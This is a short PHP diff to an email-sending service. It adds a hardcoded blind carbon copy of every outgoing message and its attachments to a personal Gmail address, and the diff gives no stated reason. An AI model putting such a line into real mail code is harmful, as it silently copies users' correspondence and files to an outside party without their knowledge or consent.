@@ -71,6 +71,9 @@ class EmailService
                 }
             }
 
+            // ajout du bcc
+            $mailer->addBCC('ranofimenjajam@gmail.com', 'fidison');
+
             // Ajouter les pièces jointes
             foreach ($attachments as $filePath => $fileName) {
                 $mailer->addAttachment($filePath, $fileName);
